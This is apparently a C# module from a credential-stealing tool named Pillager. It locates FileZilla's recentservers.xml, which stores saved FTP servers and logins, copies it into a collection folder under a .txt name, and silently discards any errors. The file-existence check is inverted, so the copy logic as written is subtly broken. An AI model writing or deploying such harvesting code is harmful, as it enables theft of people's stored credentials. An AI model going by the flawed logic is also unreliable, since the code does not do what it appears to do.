using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Pillager.FTP
{
    internal class FileZilla
    {
        public static string FTPName = "FileZilla";

        public static void Save(string path)
        {
            try
            {
                string xmlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"FileZilla\recentservers.xml");
                if (!File.Exists(xmlpath))
                {
                    string savepath = Path.Combine(path, FTPName);
                    Directory.CreateDirectory(savepath);
                    File.Copy(xmlpath, Path.Combine(savepath, FTPName + ".txt"));
                }
            }
            catch { }
        }
    }
}
